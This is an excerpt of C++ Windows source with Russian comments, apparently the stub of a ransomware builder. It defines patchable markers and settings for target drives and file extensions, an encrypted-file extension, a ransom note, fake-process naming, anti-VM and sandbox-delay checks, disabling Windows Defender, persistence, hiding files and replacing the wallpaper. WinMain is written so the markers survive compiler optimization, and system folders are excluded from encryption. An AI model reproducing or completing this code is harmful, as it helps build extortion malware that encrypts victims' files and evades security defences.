...
// ============================================================
// МАРКЕРЫ ДЛЯ ПАТЧИНГА (НЕ УДАЛЯТЬ, НЕ ОПТИМИЗИРОВАТЬ!)
// ============================================================
const char MARKER_DRIVES[] = "|DRIVES|";
const char MARKER_EXTS[] = "|EXTS|";
const char MARKER_ENC_EXT[] = "|ENC_EXT|";
const char MARKER_NOTE_NAME[] = "|NOTE_NAME|";
const char MARKER_NOTE_CONTENT[] = "|NOTE_CONTENT|";
const char MARKER_FAKE_NAME[] = "|FAKE_NAME|";
const char MARKER_ALGO[] = "|ALGO|";
const char MARKER_FAKE_ENABLED[] = "|FAKE_ENABLED|";
const char MARKER_HIDE_ENABLED[] = "|HIDE_ENABLED|";
const char MARKER_ANTI_VM[] = "|ANTI_VM|";
const char MARKER_DISABLE_DEFENDER[] = "|DEFENDER|";
const char MARKER_PERSISTENCE[] = "|PERSISTENCE|";
const char MARKER_HIDE_FILES[] = "|HIDE_FILES|";
const char MARKER_SANDBOX_DELAY[] = "|DELAY|";
const char MARKER_WALLPAPER_BASE64[] = "|WALLPAPER_BASE64|";
const char MARKER_WALLPAPER_EXT[] = "|WALLPAPER_EXT|";

// ============================================================
// НАСТРОЙКИ (ПО УМОЛЧАНИЮ — БУДУТ ЗАМЕНЕНЫ ПАТЧЕРОМ)
// ============================================================
const char* g_Drives = "|DRIVES|";
const char* g_Exts = "|EXTS|";
const char* g_EncryptedExt = "|ENC_EXT|";
const char* g_NoteName = "|NOTE_NAME|";
const char* g_NoteContent = "|NOTE_CONTENT|";
const char* g_FakeName = "|FAKE_NAME|";
const char* g_WallpaperBase64 = "|WALLPAPER_BASE64|";
const char* g_WallpaperExt = "|WALLPAPER_EXT|";
const int g_Algo = 0;          // будет заменен на |ALGO|
const int g_FakeEnabled = 0;   // будет заменен на |FAKE_ENABLED|
const int g_HideEnabled = 0;   // будет заменен на |HIDE_ENABLED|
const int g_AntiVM = 0;        // будет заменен на |ANTI_VM|
const int g_DisableDefender = 0; // будет заменен на |DEFENDER|
const int g_Persistence = 0;   // будет заменен на |PERSISTENCE|
const int g_HideFiles = 0;     // будет заменен на |HIDE_FILES|
const int g_SandboxDelay = 0;  // будет заменен на |DELAY|
...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // ПРИНУДИТЕЛЬНОЕ ИСПОЛЬЗОВАНИЕ МАРКЕРОВ (чтобы не вырезались оптимизатором)
    (void)MARKER_DRIVES;
    (void)MARKER_EXTS;
    (void)MARKER_ENC_EXT;
    ...
    (void)MARKER_WALLPAPER_BASE64;
    (void)MARKER_WALLPAPER_EXT;
    ...
    std::string exclude_str = "C:\\Windows|C:\\Program Files|C:\\Program Files (x86)";
